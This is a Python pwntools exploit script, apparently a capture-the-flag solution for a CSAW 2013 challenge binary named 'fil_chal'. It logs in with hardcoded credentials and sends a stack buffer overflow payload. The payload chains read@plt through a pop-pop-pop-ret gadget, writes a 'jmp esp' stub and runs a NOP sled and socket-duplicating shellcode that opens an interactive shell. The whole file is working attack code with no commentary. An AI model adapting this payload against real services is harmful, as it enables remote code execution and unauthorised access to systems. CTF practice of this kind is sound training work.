from pwn import *
context(os='linux', arch='i386', log_level='DEBUG')

# If a HOST is given on the cmdline, then assume that it is already
# running there
if 'HOST' in args:
    HOST = args['HOST']
    PORT = int(args.get('PORT', 34266))
    plt_read = 0x80486e0
else:
    # Otherwise start the binary locally
    HOST = "127.0.0.1"
    PORT = 34266
    p = process('./fil_chal')
    sleep(0.5)
    binary = ELF("./fil_chal")
    plt_read = binary.plt['read']  # read@plt: call 80486e0

SHELLCODE = asm(shellcraft.dupsh(4))

with remote(HOST, PORT) as r:
    r.sendlineafter('UserName: ', 'csaw2013')
    r.sendlineafter('Password: ', 'S1mplePWD')
    r.sendlineafter('Entry Info: ', '65535')

    buf = "A" * 0x420  # 1056
    buf += p32(plt_read)
    buf += p32(0x8049110)  # pop pop pop ret
    buf += p32(4)  # fd
    buf += p32(0x804b000)  # static
    buf += p32(2)
    buf += p32(0x804b000)  # static
    buf += asm(shellcraft.i386.nop()) * 100
    buf += SHELLCODE

    log.info("Sending payload:\n%s" % hexdump(buf))
    r.send(buf)
    r.send(asm('jmp esp'))  # Jump to Shellcode
    sleep(0.1)
    r.interactive()
